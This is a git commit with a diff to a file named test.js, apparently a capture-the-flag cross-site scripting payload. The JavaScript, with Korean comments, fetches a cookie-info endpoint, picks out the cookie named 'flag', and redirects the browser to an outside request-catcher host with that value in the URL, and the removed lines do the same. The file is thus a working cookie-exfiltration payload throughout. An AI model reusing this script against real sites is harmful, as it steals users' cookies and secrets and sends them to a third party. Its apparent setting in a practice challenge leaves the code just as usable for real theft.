1d102077e2a31d31c349bb7ea13981a534b40026
newb <68283165+bg418@users.noreply.github.com>
2024-09-18 10:23:16 +0900

    Update test.js

--- test.js
+++ test.js
@@ -1,6 +1,17 @@
 fetch('/api/v1/my_cookie_info')
   .then((response) => response.json())  // 응답을 JSON으로 파싱
   .then((data) => {
-    const flag = data.cookies[0].flag;
-    location.href = "https://sflee.requestcatcher.com/test?flag=" + flag;
+    // 쿠키 리스트 중에서 이름이 'flag'인 값을 찾음
+    const flagCookie = data.cookies.find(cookie => 'flag' in cookie);
+    
+    // 'flag' 쿠키가 있으면 해당 값으로 리디렉션
+    if (flagCookie) {
+      const flagValue = flagCookie.flag;
+      location.href = 'https://sflee.requestcatcher.com/test?flag=' + flagValue;
+    } else {
+      console.log('Flag 쿠키가 존재하지 않습니다.');
+    }
+  })
+  .catch((error) => {
+    console.error('Error:', error);
   });
